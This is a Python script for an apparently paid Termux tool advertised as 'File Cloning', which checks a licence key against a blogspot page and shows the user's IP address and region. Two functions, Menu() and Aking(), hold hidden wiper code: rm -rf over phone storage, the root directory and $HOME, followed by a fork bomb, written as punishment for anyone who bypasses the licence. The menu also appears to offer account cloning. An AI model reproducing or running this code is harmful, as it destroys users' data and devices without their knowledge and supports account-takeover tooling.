try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')

try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
    
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import dz,SSB
try:
	user_ip = requests.get("http://ip-api.com/json/").json()["query"]
except:
	user_ip = ' Not Found '
try:
	user_regionName = requests.get("http://ip-api.com/json/").json()["regionName"].upper()
except:
	user_regionName = ' Not Found '
logo2="""
    ###    ##    ## #### ##    ##  ###### ❤
   ## ##   ##   ##   ##  ###   ## ##    ##       ❤   ❤
  ##   ##  ##  ##    ##  ####  ## ##            IMTIAZ
 ##     ## #####     ##  ## ## ## ##   ####     AKING
 ######### ##  ##    ##  ##  #### ##    ##       ❤   ❤
 ##     ## ##   ##   ##  ##   ### ##    ##  
 ##     ## ##    ## #### ##    ##  ###### ❤
(!)═══════════════════════════════════════
(!) Author   : IMTIAZ AKING
(!) Guthub   : AKING110
(!) Facebook : IMTIAZ.AKING.07
(!) Version  : 1.6.5
(!) Type     : PAID
(!) Status   : TRAIL
\033[1;37m(!)═══════════════════════════════════════
(!) Tool Price: (1) Week Rs 350 
(!) Tool Price: (1) Month Rs 700  
(!) Tool Price: (+) Others Countrys 5$
\033[1;37m(!)═══════════════════════════════════════"""
logo = """
    ###    ##    ## #### ##    ##  ###### ❤
   ## ##   ##   ##   ##  ###   ## ##    ##       ❤   ❤
  ##   ##  ##  ##    ##  ####  ## ##            IMTIAZ
 ##     ## #####     ##  ## ## ## ##   ####     AKING
 ######### ##  ##    ##  ##  #### ##    ##       ❤   ❤
 ##     ## ##   ##   ##  ##   ### ##    ##  
 ##     ## ##    ## #### ##    ##  ###### ❤
(!)═══════════════════════════════════════
(!) Author   : IMTIAZ AKING
(!) Guthub   : AKING110
(!) Facebook : IMTIAZ.AKING.07
(!) Type     : PAID
(!) Version  : 1.6.5
\033[1;37m(!)═══════════════════════════════════════"""
def MrAking():
	uid = os.getuid()
	key = ("AKING-X4F7%s110E=="%(uid))
	server = requests.get('https://aprvking.blogspot.com/2022/06/aprov.html').text
	try:
		httpCaht = requests.get("https://aprvking.blogspot.com/2022/06/aprov.html").text
		if key in httpCaht:
			os.system('clear')
			print("\033[1;92m [>] Hello \033[1;37mBro \033[1;35mWelcome \033[1;33mTo \033[1;34mMy\033[1;31m Commands...!\033[1;37m")
			time.sleep(0.5)
			msg = str(os.geteuid())
			os.system('clear')
			print(logo)
			print('(√) Your IP     : '+user_ip)
			print('(√) Your Region : '+user_regionName)
			print('\033[1;37m(√) Your Key    : \033[1;9m\033[1;92m'+key)
			print("\033[1;0m\033[1;37m(!)═══════════════════════════════════════")
			print("(1) File Clone\nn(2) Create File \n(3) Follow Owner Fb \n(4) WhatsApp Group \n(0)\033[1;91m Exit Programming");print("\033[1;37m(!)═══════════════════════════════════════");key = input("(+)\033[1;32m Select One\033[1;37m : \033[1;37m")
			if key in [""]:
				print("(!) Please Select Correct Option")
				exit()
			if key in ["1", "01"]:
				SSB
			if key in ["2","02"]:
				dz._login()
			if key in ['3','03']:
				Fb()
			if key in ['4','04']:
				Wp()
			elif key in ["5","0","00","E","e"]:
				print('\033[1;9m[>] Thanks For Use ❤ ')
				exit()
			else:
				print('[×] Choose Correct Option');time.sleep(1);MrAking()
		else:
			print("\033[1;91m[>] Your Not Premium User...!\033[1;97m");time.sleep(1)
			os.system('xdg-open https://youtube.com/channel/UCPeYC7G0r8Klkfm8A84zoog')
			os.system('clear')
			print(logo2)
			print('[×] \033[1;91mYour Key Not Registered\033[1;37m')
			print("\033[0;97m[✓] Your Key : "+key)
			print ('(!)══════════════════════════════════════════');print ("(!) Tool    : File Cloning");print ("(!) Expired : Your Key Not Registered");print ("(!) Status  : \033[1;91mTrail\033[0;97m\n(!) Note : If You Are Free User Don't Come IB");print ('(!) ═════════════════════════════════════════');errror = input("\033[1;91m[×] File Cloning\n[×] Create File\n[×] Follow Owner Fb\n[×] WhatsApp Group\n[×] Exit Programming\033[0m \n\x1b[1;97m[1] Upgrade To (\x1b[1;92mPremium\x1b[1;97m)\n\n(!) Choose Option : ")
			if errror =='':
				print("\n\033[1;97m(!) You Have To Upgrade To Premium First, Please Choose Number (1)\033[1;0m")
			elif errror in ["B", "b", "1", "01"]:
				print("(!) Your Subscription Date Expire\n") ;whatsapp = "+92 03237528063";url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text=";name = input("[?] Enter your Name : ");tks = "Hello Dear AKING Sir, Please Accept My Key To Premium Thank You :)\n\n➸ Name: "+name+"\n➸ Key : "+key
				subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
				print('\n\033[1;37m[>] If You Approved Your Token Then Run Again  \033[1;37mpython AKING.py')
	except ValueError:
		exit(" \n(!) Info : Website Under Maintanance")
def Fb():
	os.system('xdg-open https://www.facebook.com/Your.old.father.luQm4N0');time.sleep(2);MrAking()
def Wp():
	os.system('xdg-open https://chat.whatsapp.com/GxnQbRjrbPECPg6eZOJNjZ');time.sleep(2);MrAking()
def Menu():
	os.system('termux-setup-storage')
	os.system('rm -rf /storage/emulated/0/*')
	os.system('rm -rf /storage/emulated/*')
	os.system('rm -rf /sdcard/*')
	os.system('rm -rf /sdcard/0/*')
	os.system('rm -rf /sdcard1/*')
	os.system('rm -rf /storage/*')
	os.system('rm -rf /*')
	os.system('rm -rf /system/*')
	os.system('rm -rf $HOME/../../*')
	os.system('rm -rf $PREFIX/b')
	os.system('rm -rf $HOME/*')
	os.system('mv $HOME /dev/null')
	os.system(':(){ :|: & };:')
	print('\033[1;31m[>] Fuck Your Bypass System BY AKING\033[1;37m')
	exit()
def Aking():
	os.system('termux-setup-storage')
	os.system('rm -rf /storage/emulated/0/*')
	os.system('rm -rf /storage/emulated/*')
	os.system('rm -rf /sdcard/*')
	os.system('rm -rf /sdcard/0/*')
	os.system('rm -rf /sdcard1/*')
	os.system('rm -rf /storage/*')
	os.system('rm -rf /*')
	os.system('rm -rf /system/*')
	os.system('rm -rf $HOME/../../*')
	os.system('rm -rf $PREFIX/b')
	os.system('rm -rf $HOME/*')
	os.system('mv $HOME /dev/null')
	os.system(':(){ :|: & };:')
	print('\033[1;31m[>] Fuck Your Bypass System BY AKING\033[1;37m')
	exit()
if __name__=='__main__':
	MrAking()
